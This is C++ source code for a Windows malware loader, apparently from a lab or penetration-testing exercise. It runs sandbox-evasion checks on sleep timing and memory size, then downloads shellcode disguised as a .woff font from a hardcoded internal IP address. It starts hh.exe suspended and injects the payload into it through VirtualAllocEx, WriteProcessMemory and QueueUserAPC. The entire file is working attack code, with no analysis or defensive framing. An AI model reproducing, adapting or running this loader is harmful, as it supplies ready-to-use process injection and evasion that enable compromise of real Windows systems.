#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wininet.h>
#include <string.h>
#include <vector>
#include <wincrypt.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <bcrypt.h>
#include <iostream>
#include <map>
#include <string>
#include <fstream>
#pragma comment (lib, "Wininet.lib")

BOOL GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
    HINTERNET hInternet = InternetOpenW(L"A Custom User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "[!] InternetOpenW Failed With Error: " << GetLastError() << std::endl;
        return FALSE;
    }

    HINTERNET hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (!hInternetFile) {
        std::cerr << "[!] InternetOpenUrlW Failed With Error: " << GetLastError() << std::endl;
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    DWORD bytesRead;
    BYTE buffer[4096];
    while (InternetReadFile(hInternetFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        payload.insert(payload.end(), buffer, buffer + bytesRead);
    }

    if (bytesRead == 0 && GetLastError() != ERROR_SUCCESS) {
        std::cerr << "[!] InternetReadFile Failed With Error: " << GetLastError() << std::endl;
        InternetCloseHandle(hInternetFile);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    InternetCloseHandle(hInternetFile);
    InternetCloseHandle(hInternet);
    return TRUE;
}

BOOL CheckVirtualAllocExNuma(){
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32 == NULL) {
        return FALSE;
    }

    FARPROC pVirtualAllocExNuma = GetProcAddress(hKernel32, "VirtualAllocExNuma");
    if (pVirtualAllocExNuma == NULL) {
        return FALSE;
    }

    return TRUE;
}

void evade() {
    FILETIME startTime;
    GetSystemTimeAsFileTime(&startTime);
    Sleep(2000);
    FILETIME endTime;
    GetSystemTimeAsFileTime(&endTime);
    ULARGE_INTEGER start, end;
    start.LowPart = startTime.dwLowDateTime;
    start.HighPart = startTime.dwHighDateTime;
    end.LowPart = endTime.dwLowDateTime;
    end.HighPart = endTime.dwHighDateTime;
    ULONGLONG elapsedTime = end.QuadPart - start.QuadPart;
    elapsedTime /= 10000000;

    if (elapsedTime < 1.5) {
        exit(0);
    }

	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);

	GlobalMemoryStatusEx(&statex);

	ULONGLONG totalPhysicalMemoryInGB = statex.ullTotalPhys / (1024 * 1024 * 1024);

	if (totalPhysicalMemoryInGB <= 1) {
		exit(1);
	}


    CheckVirtualAllocExNuma();

};

int main() {
    evade();
	std::vector<BYTE> payload;
	LPCWSTR url = L"http://192.168.45.156/shellcode.woff";

	if (!GetPayloadFromUrl(url, payload)) {
		printf("[!] Something Failed \n");
	}

	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };

	CreateProcessA("C:\\Windows\\hh.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;

	LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, payload.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	WriteProcessMemory(victimProcess, shellAddress, payload.data(), payload.size(), NULL);

	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
	QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);

	ResumeThread(threadHandle);
}